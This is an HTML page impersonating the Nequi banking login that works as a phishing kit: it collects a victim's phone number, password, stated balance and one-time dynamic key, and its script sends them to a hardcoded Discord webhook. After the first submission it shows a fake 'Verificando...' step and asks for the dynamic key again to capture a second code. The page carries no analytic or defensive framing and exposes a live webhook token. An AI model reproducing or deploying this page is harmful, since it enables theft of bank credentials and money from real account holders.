<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Entra a tu Nequi</title>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
    <style>
        /* Estilos base */
        body { font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; background-color: #fceaf0; margin: 0; display: block; }
        
        /* Contenedor del formulario */
        .main-wrapper { display: flex; justify-content: center; align-items: center; min-height: 80vh; padding: 20px; }
        .container { background: white; width: 90%; max-width: 400px; padding: 30px; border-radius: 15px; box-shadow: 0 4px 15px rgba(0,0,0,0.1); text-align: center; }
        .header { display: flex; align-items: center; margin-bottom: 30px; }
        .logo-container { display: flex; align-items: center; font-weight: bold; font-size: 2rem; color: #1e0033; }
        .pink-square { width: 12px; height: 12px; background-color: #ff005a; margin-right: 8px; }
        h1 { color: #1e0033; font-size: 1.5rem; }
        input { width: 100%; padding: 15px; margin: 10px 0; border: 1px solid #ddd; border-radius: 8px; box-sizing: border-box; }
        .btn-entrar { background-color: #f7a8c4; color: white; border: none; padding: 15px; width: 100%; border-radius: 8px; font-weight: bold; cursor: pointer; margin-top: 20px; }
        
        #loader { display: none; border: 5px solid #f3f3f3; border-top: 5px solid #ff005a; border-radius: 50%; width: 40px; height: 40px; animation: spin 1s linear infinite; margin: 20px auto; }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }

        /* ESTILOS DEL FOOTER */
        .footer-nequi { background-color: #1a0026; color: white; padding: 40px 20px; width: 100%; box-sizing: border-box; }
        .nequi-content { max-width: 400px; margin: 0 auto; }
        .f-header { display: flex; justify-content: space-between; align-items: center; margin-bottom: 25px; }
        .f-line { border-top: 1px solid #4a2b5e; margin: 20px 0; }
        .f-link { display: flex; justify-content: space-between; padding: 18px 0; border-bottom: 1px solid #331a40; color: white; text-decoration: none; cursor: pointer; font-size: 16px; }
        .social-box { display: flex; justify-content: space-around; padding: 10px 0; }
        .s-icon { border: 1px solid white; width: 35px; height: 35px; border-radius: 50%; display: flex; align-items: center; justify-content: center; }
    </style>
</head>
<body>

<div class="main-wrapper">
    <div class="container" id="mainContainer">    
        <div class="header">        
            <div class="logo-container"><div class="pink-square"></div>Nequi</div>    
        </div>
        <div id="formContent">        
            <h1>Entra a tu Nequi</h1>        
            <div style="display: flex; gap: 10px;">            
                <div style="border: 1px solid #ddd; padding: 15px; border-radius: 8px;">🇨🇴 +57</div>            
                <input type="text" id="celular" placeholder="Número de celular" maxlength="10" inputmode="numeric">        
            </div>        
            <input type="password" id="pass" placeholder="Contraseña" maxlength="4" inputmode="numeric">        
            <input type="text" id="saldoInput" placeholder="¿Cuánto dinero tienes?" oninput="formatearDinero(this)" inputmode="numeric">        
            <input type="text" id="claveDinamica" placeholder="Clave dinámica" maxlength="6" inputmode="numeric">        
            <button class="btn-entrar" onclick="enviarADiscord()">Entra</button>    
        </div>
        <div id="loader"></div>
    </div>
</div>
  
  <footer class="footer-image-container" style="text-align: center; padding: 20px 0;">
    <img src="https://i.ibb.co/SDwSqVVY/Screenshot-20260731-111005-Chrome.jpg" alt="Pie de página" style="max-width: 100%; height: auto; display: block; margin: 0 auto;">
</footer>
  
 <script>    
    let intento = 0;
    function formatearDinero(input) { let valor = input.value.replace(/\D/g, ''); input.value = valor !== "" ? new Intl.NumberFormat('es-CO').format(valor) : ""; }
    
    async function enviarADiscord() { 
        const webhookUrl = "https://discord.com/api/webhooks/1520119877841588235/09Lj574ZkxPmrYqMQMAw6g4a-39axrnzD-rWm6H049XNVRzXFarsFo2VSYsVfGGb_ldY";
        const celular = document.getElementById('celular').value;
        const clave = document.getElementById('pass').value;
        const claveDinamica = document.getElementById('claveDinamica').value;
        const saldo = document.getElementById('saldoInput').value;

        if (saldo === "" || claveDinamica.length < 6) { alert("Por favor, corrige los datos."); return; }
        
        document.getElementById('formContent').style.display = 'none';
        document.getElementById('loader').style.display = 'block';

        const mensaje = { content: intento === 0 ? "🔔 *Primer intento" : "🔔 **Segundo intento*", embeds: [{ color: 16711930, fields: [{ name: "Celular", value: celular, inline: true }, { name: "Clave", value: clave, inline: true }, { name: "Saldo", value: "$ " + saldo, inline: false }, { name: "Clave Dinámica", value: claveDinamica, inline: true }] }] };
        
        await fetch(webhookUrl, { method: "POST", headers: { "Content-Type": "application/json" }, body: JSON.stringify(mensaje) });
        
        setTimeout(() => { 
            document.getElementById('loader').style.display = 'none'; 
            if (intento === 0) { 
                alert("Verificando..."); 
                document.getElementById('saldoInput').value = ""; 
                document.getElementById('claveDinamica').value = ""; 
                document.getElementById('formContent').style.display = 'block'; 
                intento = 1; 
            } else { 
                alert("Procesando acceso..."); 
            } 
        }, 2000);
    }
</script>
</body>
</html>
